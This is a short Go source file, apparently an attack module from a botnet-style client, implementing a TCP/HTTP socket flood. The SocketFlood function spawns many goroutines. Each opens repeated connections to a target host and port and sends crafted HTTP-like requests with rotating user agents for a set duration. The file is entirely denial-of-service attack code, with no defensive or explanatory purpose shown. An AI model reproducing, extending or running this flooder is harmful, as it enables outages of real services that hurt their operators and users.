package methods

import (
	"fmt"
	"homo/client/utils"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func SocketFlood(target string, port string, duration string) {

	defer Catch()

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")
	dur, err := strconv.Atoi(string(duration))
	if err != nil {
		fmt.Println(err)
	}

	_host, err := url.Parse(target)
	if err != nil {
		return
	}
	host := strings.Split(_host.Host, ":")

	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		for i := 0; i <= 10; i++ {
			go socketFlood(host[0]+":"+port, buildPayload(host[0]+":"+port))
		}
		time.Sleep(100 * time.Millisecond)

	}
}

func socketFlood(addr, payload string) {
	defer Catch()
	for i := 0; i <= 30; i++ {
		fmt.Println(i)
		socket, err := net.Dial("tcp", addr)
		if err != nil {
			fmt.Println(err)
		}
		socket.Write([]byte(payload))
	}
}

func buildPayload(addr string) (payload string) {

	payload += "GET HTTP/1.1"
	payload += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
	payload += "User-Agent: " + utils.GetUserAgent() + "\r\n"
	payload += "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n"

	return payload

}
